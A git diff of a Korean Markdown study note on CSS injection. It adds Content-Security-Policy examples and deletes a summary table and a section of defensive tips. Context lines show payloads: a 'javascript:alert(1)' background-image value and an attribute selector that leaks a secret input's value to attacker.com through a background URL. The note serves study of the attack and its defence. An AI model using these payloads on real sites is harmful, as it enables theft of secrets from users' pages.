@@ -45,6 +45,10 @@ red; background-image: url(javascript:alert(1));
 
 * CSP는 페이지 내에서 어떤 리소스(JavaScript, 이미지, 스타일 등)를 불러올 수 있는지를 제한하는 **브라우저 보안 정책**입니다.
 * 예: `Content-Security-Policy: script-src 'self'` → 외부 JS 차단
+* 예: `default-src 'none'` → 외부 요청 차단
+* 예: `style-src 'unsafe-inline'` → <style> 태그 사용 가능
+<img width="1182" height="1540" alt="image" src="https://github.com/user-attachments/assets/8f4c2621-d999-4bf7-badf-efbf29e375c4" />
+
 
 ### ◾ DOMPurify
 
@@ -57,7 +61,7 @@ red; background-image: url(javascript:alert(1));
 
 ---
 
-### 🧠 CSS Injection 구문
+## 🧠 CSS Injection 구문
 
 | 선택자 구문          | 설명                                                                            |
 | --------------- | ----------------------------------------------------------------------------- |
@@ -163,28 +167,3 @@ input[name="secret"][value^="dc"] { background: url(https://attacker.com/leak?q=
 
 ---
 
-## 🔧 요약 정리
-
-| 개념            | 설명                         |
-| ------------- | -------------------------- |
-| CSS Injection | 사용자 입력을 통해 CSS를 주입하는 공격 방식 |
-| 정보 유출 방식      | 조건부 선택자 + 외부 URL 요청        |
-| \[value^=x]   | 해당 값이 x로 시작할 때             |
-| \[value\$=x]  | 해당 값이 x로 끝날 때              |
-| 병렬 요청         | 여러 조건을 동시에 테스트하여 속도 향상     |
-| 최적화 이유        | 전체 요청 횟수를 줄이고 익스플로잇 속도 향상  |
-
----
-
-## 💡 보안 관점 팁
-
-이런 공격을 방지하려면:
-
-* `<style>`이나 `style=` 같은 인라인 CSS 삽입을 **제한**
-* 사용자 입력을 CSS로 **직접 출력하지 말 것**
-* Content Security Policy(CSP)를 통해 외부 요청을 제한
-* 서버 로그를 통해 의심스러운 요청 감지
-
----
-
-궁금한 부분 있으면 더 설명해줄게요. 예제나 시각화도 가능해요!
